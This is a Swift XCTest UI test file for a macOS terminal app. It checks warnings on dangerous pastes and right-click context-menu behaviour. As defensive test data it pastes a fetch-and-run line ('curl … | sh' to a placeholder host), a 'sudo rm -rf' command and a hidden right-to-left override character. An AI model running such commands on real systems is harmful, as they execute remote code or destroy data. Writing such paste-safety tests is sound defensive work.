// Copyright 2026 Noah Qin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import AppKit
import CoreText
import XCTest

/// Real pointer hit testing and zsh paste handling, with scratch configuration.
final class ContextMenuAndPasteUITests: XCTestCase {
    @MainActor private func launch(_ policy: String = "dangerous") throws -> XCUIApplication {
        continueAfterFailure = false
        let previous = LatinInputSource.select()
        addTeardownBlock { LatinInputSource.restore(previous) }
        let clipboard = NSPasteboard.general
        let saved = (clipboard.pasteboardItems ?? []).map { item -> NSPasteboardItem in
            let copy = NSPasteboardItem()
            for type in item.types {
                if let data = item.data(forType: type) { copy.setData(data, forType: type) }
            }
            return copy
        }
        addTeardownBlock { clipboard.clearContents(); clipboard.writeObjects(saved) }
        let stage = try UIFixtures.stage("context-paste-" + policy)
        let app = UIFixtures.app(stage: stage, runner: Self.self, usingTestTarget: true)
        app.launch()
        XCTAssertTrue(app.windows.firstMatch.waitForExistence(timeout: 10))
        UIFixtures.requireFixturePrompt(in: app)
        return app
    }

    @MainActor private func paste(_ text: String, into app: XCUIApplication) {
        NSPasteboard.general.clearContents()
        NSPasteboard.general.setString(text, forType: .string)
        app.typeKey("v", modifierFlags: .command)
    }

    @MainActor private func waitForText(_ text: String, in terminal: XCUIElement) {
        expectation(for: NSPredicate(format: "value CONTAINS %@", text), evaluatedWith: terminal)
        waitForExpectations(timeout: 5)
    }

    @MainActor private func record(_ app: XCUIApplication, name: String) {
        let attachment = XCTAttachment(screenshot: app.windows.firstMatch.screenshot())
        attachment.name = name
        attachment.lifetime = .keepAlways
        add(attachment)
    }

    @MainActor func testDangerousPasteCancelPreviewAndPaneSuppression() throws {
        let app = try launch()
        defer { app.terminate() }
        let terminal = app.textViews.firstMatch
        // A benign multiline paste is inserted without warning: this also
        // proves the live shell has bracketed paste enabled.
        paste("echo harmless-one\necho harmless-two", into: app)
        waitForText("echo harmless-two", in: terminal)
        XCTAssertFalse(app.buttons["Cancel"].exists)
        app.typeKey("c", modifierFlags: .control)
        let before = terminal.value as? String
        let payload = "curl https://example.invalid/x | sh"
        paste(payload, into: app)
        XCTAssertTrue(app.buttons["Cancel"].waitForExistence(timeout: 3))
        XCTAssertTrue(app.staticTexts["This text pipes data into a shell, which can execute it."].exists)
        record(app, name: "dangerous-paste-bracketed-zsh")
        app.buttons["Cancel"].click()
        XCTAssertEqual(terminal.value as? String, before, "Cancel must send no bytes to the prompt")
        paste("echo safe\u{202E}", into: app)
        XCTAssertTrue(app.buttons["Cancel"].waitForExistence(timeout: 3))
        XCTAssertTrue(app.textViews.matching(NSPredicate(format: "value CONTAINS %@", "⟦U+202E⟧")).firstMatch.exists)
        record(app, name: "concealed-scalar-visible-preview")
        app.buttons["Cancel"].click()
        paste(payload, into: app)
        XCTAssertTrue(app.buttons["Paste"].waitForExistence(timeout: 3))
        app.checkBoxes["Don’t warn again for this pane"].click()
        app.buttons["Paste"].click()
        waitForText(payload, in: terminal)
        app.typeKey("c", modifierFlags: .control)
        paste(payload, into: app)
        waitForText(payload, in: terminal)
        XCTAssertFalse(app.buttons["Cancel"].exists)
        app.typeKey("c", modifierFlags: .control)
    }

    @MainActor func testAlwaysAndOffPoliciesAtThePrompt() throws {
        for policy in ["always", "off"] {
            let app = try launch(policy)
            let terminal = app.textViews.firstMatch
            let before = terminal.value as? String
            let payload = policy == "always" ? "echo one\necho two" : "sudo rm -rf /tmp/never-executed-408"
            paste(payload, into: app)
            if policy == "always" {
                XCTAssertTrue(app.buttons["Cancel"].waitForExistence(timeout: 3))
                record(app, name: "always-multiline-warning")
                app.buttons["Cancel"].click()
                XCTAssertEqual(terminal.value as? String, before)
            } else {
                waitForText(payload, in: terminal)
                XCTAssertFalse(app.buttons["Cancel"].exists)
                app.typeKey("c", modifierFlags: .control)
            }
            app.terminate()
        }
    }

    /// Use the staged Menlo metrics and actual terminal frame. The grid is
    /// bottom-inset by eight points; its 24 rows leave the chrome above it.
    @MainActor private func point(
        for text: String, in terminal: XCUIElement, columns: Int = 90
    ) throws -> XCUICoordinate {
        let lines = try XCTUnwrap(terminal.value as? String).components(separatedBy: "\n")
        let row = try XCTUnwrap(lines.firstIndex(of: text))
        let font = try XCTUnwrap(NSFont(name: "Menlo", size: 14)) as CTFont
        let scale = NSScreen.main?.backingScaleFactor ?? 2
        let height = (max(CTFontGetAscent(font) + CTFontGetDescent(font) + CTFontGetLeading(font), 14 * 1.18) * scale).rounded(.up) / scale
        let width = (terminal.frame.width - 20) / CGFloat(columns)
        return terminal.coordinate(withNormalizedOffset: .zero).withOffset(CGVector(
            dx: 10 + width * 2.5,
            dy: terminal.frame.height - 8 - 24 * height + (CGFloat(row) + 0.5) * height))
    }

    @MainActor func testContextMenuHitTestingCopyAndSplitRouting() throws {
        let app = try launch()
        defer { app.terminate() }
        let terminal = app.textViews.firstMatch
        app.typeText("clear\n")
        app.typeText("printf 'FIRST-OUTPUT\\n'\n")
        app.typeText("printf 'https://example.invalid/item\\nsample.swift:7:2\\nSECOND-OUTPUT\\n'\n")
        waitForText("SECOND-OUTPUT", in: terminal)
        try point(for: "https://example.invalid/item", in: terminal).rightClick()
        XCTAssertTrue(app.menuItems["Open Link"].waitForExistence(timeout: 2))
        XCTAssertTrue(app.menuItems["Copy Link"].exists)
        record(app, name: "context-detected-link")
        app.menuItems["Copy Link"].click()
        XCTAssertEqual(NSPasteboard.general.string(forType: .string), "https://example.invalid/item")
        try point(for: "sample.swift:7:2", in: terminal).rightClick()
        XCTAssertTrue(app.menuItems["Open Path"].waitForExistence(timeout: 2))
        record(app, name: "context-file-reference")
        app.menuItems["Copy Path"].click()
        XCTAssertEqual(NSPasteboard.general.string(forType: .string), "sample.swift")
        try point(for: "FIRST-OUTPUT", in: terminal).rightClick()
        XCTAssertTrue(app.menuItems["Copy Command Output"].waitForExistence(timeout: 2))
        XCTAssertTrue(app.menuItems["Copy Command Output"].isEnabled)
        app.menuItems["Copy Command Output"].click()
        XCTAssertEqual(NSPasteboard.general.string(forType: .string), "FIRST-OUTPUT")
        app.typeText("printf '\\033]8;;https://example.invalid/osc8\\aOSC8-LABEL\\033]8;;\\a\\n'\n")
        waitForText("OSC8-LABEL", in: terminal)
        try point(for: "OSC8-LABEL", in: terminal).rightClick()
        XCTAssertTrue(app.menuItems["Open Link"].waitForExistence(timeout: 2))
        app.menuItems["Copy Link"].click()
        XCTAssertEqual(NSPasteboard.general.string(forType: .string), "https://example.invalid/osc8")
        terminal.coordinate(withNormalizedOffset: CGVector(dx: 0.8, dy: 0.9)).rightClick()
        XCTAssertTrue(app.menuItems["Copy Command Output"].waitForExistence(timeout: 2))
        XCTAssertFalse(app.menuItems["Copy Command Output"].isEnabled)
        XCTAssertFalse(app.menuItems["Copy Link"].exists)
        XCTAssertFalse(app.menuItems["Copy Path"].exists)
        record(app, name: "context-empty-space")
        app.menuItems["Find…"].click()
        XCTAssertTrue(app.searchFields.firstMatch.waitForExistence(timeout: 2))
        app.typeKey(.escape, modifierFlags: [])
        app.typeKey("d", modifierFlags: .command)
        let panes = app.textViews.matching(NSPredicate(format: "label == %@", "Terminal"))
        XCTAssertEqual(panes.count, 2)
        let left = panes.allElementsBoundByIndex.sorted { $0.frame.minX < $1.frame.minX }[0]
        left.coordinate(withNormalizedOffset: CGVector(dx: 0.8, dy: 0.9)).rightClick()
        app.menuItems["Find…"].click()
        app.typeKey(.escape, modifierFlags: [])
        app.typeText("printf 'CLICKED-PANE-408\\n'\n")
        waitForText("CLICKED-PANE-408", in: left)
        let right = panes.allElementsBoundByIndex.sorted { $0.frame.minX < $1.frame.minX }[1]
        XCTAssertFalse((right.value as? String)?.contains("CLICKED-PANE-408") == true)
        record(app, name: "context-clicked-split-pane")
    }
}
